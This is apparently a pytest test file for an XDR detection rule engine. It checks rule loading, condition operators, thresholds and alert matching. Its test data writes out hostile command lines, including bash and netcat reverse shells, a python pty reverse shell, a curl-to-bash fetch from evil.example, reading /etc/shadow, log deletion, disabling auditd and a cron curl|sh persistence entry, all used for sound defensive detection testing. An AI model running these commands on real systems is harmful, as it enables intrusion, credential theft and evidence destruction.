import pytest

from conftest import ev
from xdr.detection.rules import Condition, Rule, RuleError, RuleEngine, load_rules
from xdr.config import DEFAULTS


@pytest.fixture(scope="module")
def engine():
    return RuleEngine(DEFAULTS["detection"]["rules_dirs"])


def ids(engine, event):
    return {a.rule_id for a in engine.analyze(event)}


def test_all_rules_load(engine):
    assert len(engine.rules) >= 70
    assert len({r.id for r in engine.rules}) == len(engine.rules)


def test_condition_operators():
    e = ev("process", "start", name="Bash", pid=10, args=["a", "b"], parent={"name": "nginx"})
    assert Condition({"field": "name", "equals": "bash"}).match(e)
    assert Condition({"field": "name", "equals": "bash", "case_sensitive": True}).match(e) is False
    assert Condition({"field": "pid", "gt": 5, "lt": 11}).match(e)
    assert Condition({"field": "parent.name", "in": ["nginx", "apache2"]}).match(e)
    assert Condition({"field": "missing", "exists": False}).match(e)
    assert Condition({"not": {"field": "name", "startswith": "zsh"}}).match(e)
    assert Condition({"any": [{"field": "name", "equals": "x"}, {"field": "args", "contains": "b"}]}).match(e)
    assert Condition({"field": "args", "length_gt": 1}).match(e)
    with pytest.raises(RuleError):
        Condition({"field": "name", "bogus": 1})


def test_threshold():
    rule = Rule({"id": "T-1", "title": "t", "severity": "low", "category": "auth",
                 "threshold": {"count": 3, "window": 60, "group_by": ["src_ip"]}})
    hits = [rule.evaluate(ev("auth", "x", src_ip="1.1.1.1")) for _ in range(3)]
    assert hits == [False, False, True]
    assert rule.evaluate(ev("auth", "x", src_ip="2.2.2.2")) is False


@pytest.mark.parametrize("cmdline,rule_id", [
    ("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "PROC-001"),
    ("nc -e /bin/sh 1.2.3.4 9001", "PROC-001"),
    ("python3 -c import socket,os,pty;s=socket.socket();s.connect(('1.2.3.4',1));os.dup2(s.fileno(),0);pty.spawn('sh')", "PROC-001"),
    ("curl -fsSL http://evil.example/x.sh | bash", "PROC-002"),
    ("cat /etc/shadow", "PROC-008"),
    ("./x -o stratum+tcp://pool:3333 --donate-level 1", "PROC-009"),
    ("rm -rf /var/log/auth.log", "PROC-010"),
    ("systemctl stop auditd", "PROC-011"),
    ("echo ZWNobyBoaQ== | base64 -d | bash", "PROC-015"),
    ("vssadmin delete shadows /all /quiet", "PROC-023"),
    ("nsenter --target 1 --mount --uts --ipc --net --pid", "PROC-017"),
])
def test_process_rules(engine, cmdline, rule_id):
    assert rule_id in ids(engine, ev("process", "start", name="x", cmdline=cmdline, exe="/usr/bin/x"))


def test_benign_process_no_high_alert(engine):
    alerts = engine.analyze(ev("process", "start", name="ls", cmdline="ls -la /home", exe="/usr/bin/ls",
                               username="bob", parent={"name": "bash"}))
    assert not [a for a in alerts if a.severity in ("high", "critical")]


def test_webserver_spawning_shell(engine):
    e = ev("process", "start", name="sh", cmdline="sh -c id", exe="/bin/sh", parent={"name": "php-fpm8.2"})
    assert "PROC-007" in ids(engine, e)


def test_kernel_thread_masquerade(engine):
    assert "PROC-016" in ids(engine, ev("process", "start", name="kworkerd", exe="/tmp/.x/kworkerd"))
    assert "PROC-016" not in ids(engine, ev("process", "start", name="kworker/0:1", exe=""))


def test_persistence_rules(engine):
    e = ev("persistence", "created", path="/etc/cron.d/x", mechanism="cron",
           added_lines="* * * * * root curl -s http://x/p | sh", content="")
    assert {"PERS-001", "PERS-002"} <= ids(engine, e)
    e = ev("persistence", "modified", path="/root/.ssh/authorized_keys", mechanism="ssh", added_lines="ssh-rsa AAA")
    assert "PERS-004" in ids(engine, e)
    e = ev("persistence", "existing", path="/etc/ld.so.preload", mechanism="preload",
           content="/lib/libhide.so", added_lines="/lib/libhide.so")
    assert "PERS-005" in ids(engine, e)


def test_network_rules(engine):
    e = ev("network", "connection", direction="outbound", remote_ip="8.8.4.4", remote_port=4444,
           remote_private=False, process="bash")
    assert {"NET-001", "NET-006"} <= ids(engine, e)
    assert "NET-004" in ids(engine, ev("network", "listen", process="nc", local_port=5555, exposed=True))


def test_account_rules(engine):
    assert "ACC-001" in ids(engine, ev("account", "uid0_user", name="toor", uid=0))
    assert "ACC-003" in ids(engine, ev("account", "group_member_added", user="eve", group="sudo"))


def test_skip_initial(engine):
    assert "KRN-001" not in ids(engine, ev("kernel", "module_loaded", module="ext4", initial=True))
    assert "KRN-002" in ids(engine, ev("kernel", "module_loaded", module="diamorphine", initial=True))


def test_load_rules_rejects_duplicates(tmp_path):
    (tmp_path / "a.yaml").write_text("- {id: X, title: t, severity: low}\n- {id: X, title: t, severity: low}\n")
    with pytest.raises(RuleError):
        load_rules([str(tmp_path)])
